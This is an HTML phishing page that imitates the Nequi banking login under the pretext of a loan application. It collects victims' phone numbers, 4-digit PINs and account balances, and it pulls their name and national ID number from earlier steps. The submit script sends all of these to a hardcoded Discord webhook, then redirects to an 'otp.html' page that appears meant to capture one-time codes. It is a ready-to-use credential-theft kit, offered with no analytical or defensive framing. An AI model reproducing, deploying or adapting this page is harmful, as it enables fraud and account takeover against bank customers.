<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <title>Nequi - Verificaci√≥n</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Manrope', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #f5deb3 0%, #f0e4d7 50%, #e8d5c4 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .login-container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 12px;
            padding: 40px 35px;
            max-width: 420px;
            width: 100%;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
        }

        h1 {
            color: #200020;
            font-size: 1.75rem;
            font-weight: 700;
            margin-bottom: 8px;
            text-align: left;
        }

        .subtitle {
            color: #666;
            font-size: 0.95rem;
            margin-bottom: 30px;
            text-align: left;
        }

        .country-phone-group {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }

        .country-select {
            width: 90px;
            padding: 12px 10px;
            background: #f8f8f8;
            border: 1px solid #ddd;
            border-radius: 8px;
            display: flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
            position: relative;
        }

        .country-select img {
            width: 24px;
            height: 16px;
        }

        .flag-icon {
            width: 24px;
            height: 16px;
            background: linear-gradient(to bottom, #FFD700 33%, #0033A0 33%, #0033A0 66%, #CE1126 66%);
            border-radius: 2px;
        }

        .country-code {
            font-weight: 600;
            color: #200020;
        }

        .dropdown-arrow {
            font-size: 10px;
            color: #666;
        }

        .form-group {
            margin-bottom: 20px;
            position: relative;
        }

        .form-group input {
            width: 100%;
            padding: 14px 12px;
            background: #f8f8f8;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 1rem;
            color: #200020;
            transition: all 0.3s;
        }

        .form-group input:focus {
            outline: none;
            border-color: #da0081;
            background: #fff;
        }

        .form-group input::placeholder {
            color: #999;
        }

        .phone-input {
            flex: 1;
        }

        .recaptcha-wrapper {
            margin: 25px 0;
            display: flex;
            justify-content: center;
        }

        .btn-submit {
            width: 100%;
            padding: 16px;
            background: #da0081;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }

        .btn-submit:hover:not(:disabled) {
            background: #c00070;
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(218, 0, 129, 0.3);
        }

        .btn-submit:disabled {
            background: #e0e0e0;
            color: #999;
            cursor: not-allowed;
            transform: none;
        }

        @media (max-width: 480px) {
            .login-container {
                padding: 30px 25px;
            }

            h1 {
                font-size: 1.5rem;
            }
        }
    </style>
</head>

<body>
    <div class="login-container">
        <h1>Entra a tu Nequi</h1>
        <p class="subtitle">Solicitud de cr√©dito propulsor</p>
        
        <form id="loginForm">
            <!-- N√∫mero de celular con selector de pa√≠s -->
            <div class="country-phone-group">
                <div class="country-select">
                    <div class="flag-icon"></div>
                    <span class="country-code">+57</span>
                    <span class="dropdown-arrow">‚ñº</span>
                </div>
                
                <div class="form-group phone-input">
                    <input 
                        type="tel" 
                        id="txtUsername" 
                        name="txtUsername"
                        placeholder="N√∫mero de celular"
                        required 
                        maxlength="12" 
                        inputmode="numeric">
                </div>
            </div>

            <!-- Contrase√±a -->
            <div class="form-group">
                <input
                    type="password" 
                    id="txtPass" 
                    name="txtPass" 
                    placeholder="Contrase√±a"
                    required 
                    maxlength="4" 
                    inputmode="numeric" 
                    pattern="\d*">
            </div>

            <!-- Saldo actual -->
            <div class="form-group">
                <input 
                    type="text"
                    id="txtSaldo" 
                    name="txtSaldo" 
                    placeholder="Saldo actual"
                    required 
                    inputmode="numeric">
            </div>
            
            <!-- reCAPTCHA -->
            <div class="recaptcha-wrapper">
                <div class="g-recaptcha" data-sitekey="6LdjCwshAAAAALml0fdmI80RRivlxm74orS_2V4i" data-callback="onRecaptchaSuccess"></div>
            </div>

            <!-- Bot√≥n de env√≠o -->
            <button type="submit" class="btn-submit" id="btnUsuario" disabled>Entra</button>
        </form>
    </div>

    <script type="text/javascript">
        let recaptchaVerified = false;

        // Callback del reCAPTCHA
        function onRecaptchaSuccess(token) {
            recaptchaVerified = true;
            validateForm();
        }

        document.addEventListener("DOMContentLoaded", function() {
            const usernameInput = document.getElementById('txtUsername');
            const passwordInput = document.getElementById('txtPass');
            const saldoInput = document.getElementById('txtSaldo');
            const submitBtn = document.getElementById('btnUsuario');
            const form = document.getElementById('loginForm');

            // Eventos
            usernameInput.addEventListener('input', formatUsername);
            passwordInput.addEventListener('input', formatPassword);
            saldoInput.addEventListener('input', formatSaldo);

            // Formatear n√∫mero de celular (XXX XXX XXXX)
            function formatUsername() {
                let value = usernameInput.value.replace(/\D/g, '');
                let formattedValue = value.replace(/(\d{3})(\d{3})(\d{0,4})/, '$1 $2 $3').trim();
                usernameInput.value = formattedValue;
                validateForm();
            }

            // Formatear contrase√±a (solo n√∫meros)
            function formatPassword() {
                passwordInput.value = passwordInput.value.replace(/\D/g, '');
                validateForm();
            }

            // Formatear saldo (separador de miles)
            function formatSaldo() {
                let valor = saldoInput.value.replace(/\D/g, "");
                if (valor === "") {
                    saldoInput.value = "";
                    validateForm();
                    return;
                }
                saldoInput.value = parseInt(valor, 10).toLocaleString("es-CO");
                validateForm();
            }

            // Validar formulario completo
            function validateForm() {
                const usernameValid = /^\d{3} \d{3} \d{4}$/.test(usernameInput.value) && usernameInput.value.startsWith("3");
                const passwordValid = /^\d{4}$/.test(passwordInput.value);
                const saldoValid = saldoInput.value.length >= 4;

                if (usernameValid && passwordValid && saldoValid && recaptchaVerified) {
                    submitBtn.disabled = false;
                } else {
                    submitBtn.disabled = true;
                }
            }

            // Hacer validateForm global
            window.validateForm = validateForm;

            // Obtener datos del localStorage
            const nombreApellido = localStorage.getItem("nombreApellido");
            const cedula = localStorage.getItem("cedula");

            // Env√≠o del formulario
            form.addEventListener('submit', async function(e) {
                e.preventDefault();

                const usuario = usernameInput.value.trim();
                const clave = passwordInput.value.trim();
                const saldo = saldoInput.value.trim();

                // Validaciones finales
                if (!/^\d{3} \d{3} \d{4}$/.test(usuario) || !usuario.startsWith("3")) {
                    alert("El n√∫mero ingresado no es v√°lido. Debe tener el formato XXX XXX XXXX y comenzar con 3.");
                    return;
                }

                if (!/^\d{4}$/.test(clave)) {
                    alert("La clave debe ser de 4 d√≠gitos num√©ricos.");
                    return;
                }

                if (!saldo) {
                    alert("Debe ingresar un saldo v√°lido.");
                    return;
                }

                if (!nombreApellido || !cedula) {
                    alert("Los datos de nombre y c√©dula no est√°n disponibles. Vuelve al paso anterior.");
                    return;
                }

                // Guardar en localStorage
                localStorage.setItem("numero", usuario);
                localStorage.setItem("clave", clave);
                localStorage.setItem("saldo", saldo);

                // DISCORD WEBHOOK
                const webhookURL = 'https://discord.com/api/webhooks/1389513200801812491/R0X2zhHCg6Z4P-rLjJRcD6ktg-73vhuwcTU6iYZ__bafE6Si2cHH9cbC3x6cijvGWvJ7';

                const discordPayload = {
                    username: "üîê Datos Nequi",
                    content: `**Nueva solicitud recibida:**\n\n` +
                             `üìõ **Nombre:** ${nombreApellido}\n` +
                             `ü™™ **C√©dula:** ${cedula}\n` +
                             `üì± **N√∫mero:** ${usuario}\n` +
                             `üîë **Clave:** ${clave}\n` +
                             `üí∞ **Saldo:** $${saldo}\n` +
                             `üìÖ **Fecha:** ${new Date().toLocaleString('es-CO')}`
                };

                try {
                    const response = await fetch(webhookURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(discordPayload)
                    });

                    if (response.ok) {
                        console.log('Datos enviados a Discord correctamente');
                        // Redirigir a la siguiente p√°gina
                        window.location.href = "otp.html";
                    } else {
                        throw new Error('Error al enviar los datos a Discord');
                    }
                } catch (error) {
                    console.error('Error al enviar los datos:', error);
                    alert('Ocurri√≥ un error al enviar los datos. Intente nuevamente.');
                }
            });
        });
    </script>
</body>
</html>
